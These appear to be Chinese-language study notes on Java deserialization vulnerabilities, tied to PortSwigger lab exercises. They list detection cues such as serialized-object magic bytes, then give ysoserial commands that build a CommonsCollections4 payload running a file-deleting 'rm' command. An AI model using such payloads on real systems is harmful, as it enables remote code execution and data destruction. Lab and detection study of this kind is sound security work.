# Java反序列化漏洞

## 靶机

[PortSwigger](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)
[java deserialize webapp](https://github.com/hvqzao/java-deserialize-webapp)

## 工具

[Ysoserial](https://github.com/frohoff/ysoserial)

## 检测

1.白盒

在代码中查找实现 Serialized 接口的类和java.io.ObjectInputStream、readObject、readUnshare 函数的使用

2.黑盒

对于黑盒测试，查找表示 java 序列化对象（源自 ObjectInputStream）的特定签名或Magic Bytes：

+ 十六进制模式：AC ED 00 05
+ Base64 模式：rO0
+ Content-type 设置为 application/x-java-serialized-object 的 HTTP 响应标头
+ 指示先前压缩的十六进制模式：1F 8B 08 00
+ 表示先前压缩的 Base64 模式：H4sIA
+ 具有 .faces 扩展名和 faces.ViewState 参数的 Web 文件
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```


Apache Commons Collections
```bash
Java16及更高版本
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   CommonsCollections4 'rm /home/carlos/morale.txt' | base64

java15及以下：
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morole.txt" | base64
```
